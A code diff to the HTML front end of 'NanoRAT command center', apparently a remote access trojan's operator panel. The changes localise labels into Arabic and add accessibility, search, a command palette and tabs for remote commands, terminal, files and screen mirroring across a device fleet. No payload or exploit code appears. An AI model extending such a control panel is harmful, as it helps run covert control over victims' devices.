@@ -10,47 +10,79 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/globe.gl@2.32.0/dist/globe.gl.min.js"></script>
 </head>
-<body>
+<body data-density="comfortable" data-view="list">
 
 <div id="app">
 
   <!-- ═══════════════ TOPBAR ═══════════════ -->
   <header id="topbar">
+    <!-- Zone 1: identity. Fixed width so it never reflows the rest. -->
     <div class="brand">
-      <div class="logo"></div>
-      <div>
-        <h1>NanoRAT</h1>
-        <span class="tag">command center</span>
+      <span class="logo" aria-hidden="true"></span>
+      <span class="brand-text">
+        <span class="brand-name">NanoRAT</span>
+        <span class="brand-sub">command center</span>
+      </span>
+    </div>
+
+    <!-- Zone 2: the two search affordances. Grows, capped, never shrinks
+         the controls in zones 1 and 3. -->
+    <div class="topbar-center">
+      <div class="search-wrap" role="search">
+        <span class="search-icon" aria-hidden="true"></span>
+        <input id="global-search" type="search" autocomplete="off" spellcheck="false"
+               placeholder="ابحث بالجهاز أو الـ IP أو الوسم أو الموديل"
+               aria-label="Search devices">
+        <button id="search-clear" class="search-clear" type="button"
+                title="مسح" aria-label="Clear search" hidden>
+          <span aria-hidden="true">✕</span>
+        </button>
+        <span id="search-count" class="search-count" aria-live="polite"></span>
       </div>
+
+      <button id="btn-palette" class="palette-trigger" type="button"
+              title="لوحة الأوامر (Ctrl-K)">
+        <span class="pt-icon" aria-hidden="true">⌘</span>
+        <span class="pt-label">أوامر</span>
+        <kbd aria-hidden="true">K</kbd>
+      </button>
     </div>
 
-    <div class="search-wrap">
-      <span class="search-icon">🔍</span>
-      <input id="global-search" placeholder="search device / ip / tag / model…" autocomplete="off">
-    </div>
-
-    <div class="topbar-stats" id="topbar-stats">
-      <div class="tstat"><span id="stat-online">0</span><label>online</label></div>
-      <div class="tstat"><span id="stat-total">0</span><label>total</label></div>
-      <div class="tstat"><span id="stat-cmds">0</span><label>cmds</label></div>
-      <div class="tstat"><span id="stat-files">0</span><label>files</label></div>
+    <!-- Zone 3: counters, then controls. -->
+    <div class="topbar-stats" id="topbar-stats" role="group" aria-label="Fleet counters">
+      <div class="tstat"><span id="stat-online">0</span><label>متصل</label></div>
+      <div class="tstat"><span id="stat-total">0</span><label>المجموع</label></div>
+      <div class="tstat"><span id="stat-cmds">0</span><label>أوامر</label></div>
+      <div class="tstat"><span id="stat-files">0</span><label>ملفات</label></div>
     </div>
 
     <div class="topbar-actions">
-      <button id="btn-view-toggle" title="Toggle view">▤</button>
-      <button id="btn-sound" title="Toggle sound">🔔</button>
-      <button id="btn-logout" title="Log out">⏻</button>
+      <button id="btn-view-toggle" type="button" title="تبديل العرض" aria-label="Toggle view">
+        <span aria-hidden="true">▤</span>
+      </button>
+      <button id="btn-density" type="button" title="الكثافة" aria-label="Toggle density">
+        <span aria-hidden="true">▥</span>
+      </button>
+      <button id="btn-sound" type="button" title="الصوت" aria-label="Toggle sound">
+        <span aria-hidden="true">🔔</span>
+      </button>
+      <button id="btn-logout" type="button" title="خروج" aria-label="Log out">
+        <span aria-hidden="true">⏻</span>
+      </button>
     </div>
   </header>
+
+  <!-- ═══════════════ VITALS ═══════════════ -->
+  <div id="vitals" class="vitals" aria-label="live fleet metrics"></div>
 
   <!-- ═══════════════ MAIN GRID ═══════════════ -->
   <main id="main">
 
     <!-- SIDEBAR -->
     <aside id="sidebar">
-      <div class="sidebar-head">
-        <h2>Devices</h2>
-        <span class="muted" id="sidebar-count">0</span>
+      <div class="sec-head">
+        <h2 class="sec-title">الأجهزة</h2>
+        <span class="sec-count" id="sidebar-count">0</span>
       </div>
 
       <div class="filter-row">
@@ -77,14 +109,15 @@
 
     <!-- ACTIVITY PANEL -->
     <aside id="activity-panel">
-      <div class="sidebar-head">
-        <h2>Activity</h2>
-        <button id="btn-clear-activity" title="clear">✕</button>
+      <div class="sec-head">
+        <h2 class="sec-title">النشاط</h2>
+        <button id="btn-clear-activity" class="sec-action" type="button"
+                title="مسح" aria-label="Clear activity">✕</button>
       </div>
       <div id="activity-feed"></div>
 
-      <div class="sidebar-head" style="margin-top:16px">
-        <h2>Queue</h2>
+      <div class="sec-head sec-head-sub">
+        <h2 class="sec-title">الطابور</h2>
       </div>
       <div id="queue-feed"></div>
     </aside>
@@ -111,14 +144,31 @@
       <button id="dev-close" class="close-x">✕</button>
     </header>
 
-    <nav class="tabs">
-      <button data-tab="overview" class="active">نظرة</button>
-      <button data-tab="commands">أوامر</button>
-      <button data-tab="terminal">طرفية</button>
-      <button data-tab="files">ملفات</button>
-      <button data-tab="mirror">بث الشاشة</button>
-      <button data-tab="logs">سجلات</button>
-      <button data-tab="notes">ملاحظات</button>
+    <nav class="tabs" id="device-tabs" role="tablist" style="--i:0;--n:7">
+      <span class="tab-indicator" aria-hidden="true"></span>
+      <button type="button" role="tab" data-tab="overview" class="active" aria-selected="true">
+        <span class="tab-label">نظرة</span>
+      </button>
+      <button type="button" role="tab" data-tab="commands" aria-selected="false">
+        <span class="tab-label">أوامر</span>
+        <span class="tab-badge" id="tab-badge-commands" hidden></span>
+      </button>
+      <button type="button" role="tab" data-tab="terminal" aria-selected="false">
+        <span class="tab-label">طرفية</span>
+      </button>
+      <button type="button" role="tab" data-tab="files" aria-selected="false">
+        <span class="tab-label">ملفات</span>
+        <span class="tab-badge" id="tab-badge-files" hidden></span>
+      </button>
+      <button type="button" role="tab" data-tab="mirror" aria-selected="false">
+        <span class="tab-label">بث الشاشة</span>
+      </button>
+      <button type="button" role="tab" data-tab="logs" aria-selected="false">
+        <span class="tab-label">سجل</span>
+      </button>
+      <button type="button" role="tab" data-tab="notes" aria-selected="false">
+        <span class="tab-label">ملاحظات</span>
+      </button>
     </nav>
 
     <div class="tab-body">
@@ -129,8 +179,9 @@
 
       <div data-panel="commands" class="tab-panel">
         <div id="cmd-coverage" class="cmd-coverage unknown"></div>
-        <div class="cmd-search">
-          <input id="cmd-filter" placeholder="filter commands…" autocomplete="off">
+        <div class="field-search">
+          <input id="cmd-filter" type="search" autocomplete="off" spellcheck="false"
+                 placeholder="صفّي الأوامر…" aria-label="Filter commands">
         </div>
         <div id="command-catalog"></div>
       </div>
@@ -171,9 +222,10 @@
       </div>
 
       <div data-panel="logs" class="tab-panel">
-        <div class="audit-head">
-          <span class="audit-title">operator actions</span>
-          <button id="audit-verify" title="Verify digest chain">verify chain</button>
+        <div class="sec-head sec-head-inline">
+          <h2 class="sec-title">إجراءات المشغّل</h2>
+          <button id="audit-verify" class="sec-action" type="button"
+                  title="تحقّق من سلسلة السجل">تحقّق</button>
         </div>
         <div id="audit-log"></div>
       </div>
@@ -207,8 +259,10 @@
 <div id="toast-stack"></div>
 
 <script src="/static/js/panel.js"></script>
+<script src="/static/js/vitals.js"></script>
 <script src="/static/js/globe.js"></script>
 <script src="/static/js/terminal.js"></script>
+<script src="/static/js/palette.js"></script>
 <script src="/static/js/dashboard.js"></script>
 </body>
 </html>
